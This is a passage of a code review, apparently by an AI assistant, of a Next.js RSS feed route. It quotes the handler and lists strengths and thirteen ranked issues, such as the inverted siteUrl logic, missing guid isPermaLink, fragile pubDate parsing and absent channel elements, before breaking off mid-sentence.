      const siteUrl = PERSONAL.handle ? `https://your-domain.com` : "https://localhost:3000";
      const items = articles.map(a => `    <item>
          <title>${escapeXml(a.titleEn)}</title>
          <link>${siteUrl}/#articles</link>
          <description>${escapeXml(a.summaryEn || "")}</description>
          <category>${escapeXml(a.typeEn || "Article")}</category>
          <pubDate>${new Date(a.date + "-01").toUTCString()}</pubDate>
          <guid>${a.id}</guid>
        </item>`).join("\n");
      const rss = `<?xml version="1.0" encoding="UTF-8"?>
    <rss version="2.0">
      <channel>
        <title>${escapeXml(PERSONAL.fullName.en)} — Articles</title>
        <link>${siteUrl}</link>
        <description>Latest articles and papers</description>
        <language>en</language>
    ${items}
      </channel>
    </rss>`;
      return new NextResponse(rss, { headers: { "Content-Type": "application/xml; charset=utf-8" } });
    }
  Positives:
    - Route exists, returns application/xml ✅
    - Queries 20 most recent visible articles ✅
    - escapeXml function (lines 43-45) escapes <, >, &, ', " ✅
  Negatives:
    1. **BROKEN siteUrl TERNARY** (line 16): `PERSONAL.handle ? "https://your-domain.com" : "https://localhost:3000"`.
       PERSONAL.handle is currently the placeholder string "your-handle" (truthy)
       → siteUrl = "https://your-domain.com" (the placeholder, NOT the real
       domain). If a user removes the handle (empty string), siteUrl falls
       back to "https://localhost:3000" — wrong in both branches. Logic is
       inverted/nonsensical.  (HIGH via cross-cutting issue A).
    2. **EVERY ITEM LINKS TO /#articles** (line 20): `<link>${siteUrl}/#articles</link>`.
       Articles are not individually addressable. RSS readers cannot deep-
       link to a specific article. This is a fundamental limitation of the
       one-page architecture (cross-cutting issue E).  (MED).
    3. **`<guid>` has no `isPermaLink="false"`** (line 24): default is
       `isPermaLink="true"`, which means RSS readers will try to fetch
       `${a.id}` as a URL (e.g., "abc123" → "http://abc123/"). Should be
       `<guid isPermaLink="false">${a.id}</guid>` or use the article URL.
       (MED).
    4. **`pubDate` ASSUMES YYYY-MM FORMAT** (line 23):
       `new Date(a.date + "-01")` appends "-01" to a.date — works only if
       a.date is "YYYY-MM" (e.g., "2024-05" → "2024-05-01"). If a.date is
       "YYYY-MM-DD" already (e.g., "2024-05-15"), produces "2024-05-15-01"
       → Invalid Date → `new Date(...).toUTCString()` returns "Invalid Date"
       → RSS feed has broken pubDates. Schema not checked here, but risky.
       (MED).
    5. **CHANNEL MISSING `<lastBuildDate>`** — recommended by RSS 2.0 spec;
       some validators warn.  (LOW).
    6. **CHANNEL MISSING `<atom:link rel="self">`** — required by some
       aggregators (FeedBurner, etc.) and recommended by W3C feed validator.
       (LOW).
    7. **CHANNEL MISSING `<ttl>`** (time-to-live in minutes) — optional.  (informational).
    8. **CHANNEL MISSING `<image>`** — RSS spec allows a channel logo;
       useful for brand recognition in RSS readers.  (LOW).
    9. **CHANNEL `<language>en</language>`** (line 33) but OG locale is fa_IR
       and manifest is fa/rtl — three-way conflict (cross-cutting issue D).
       (MED).
    10. **NO CONTENT-TYPE INCLUDES `charset=utf-8`?** Actually it does (line 39):
        `"application/xml; charset=utf-8"` ✅. (no issue).
    11. **PERSONAL.fullName.en is placeholder** ("your-handle" / placeholder
        in content.ts) → channel title is "your-handle — Articles" or
        similar placeholder.  (MED via cross-cutting issue C).
    12. **NO ERROR HANDLING** if db.article.findMany throws.  (LOW).
    13. **NO CACHING** — every request hits the DB; for a high-traffic RSS
        feed this is wasteful. Should use `revalidate` or cache headers.
        (LOW — informational; Next.js Route Handlers are dynamic by default).
  Severity: MED (functional feed but with broken siteUrl logic, non-permalink
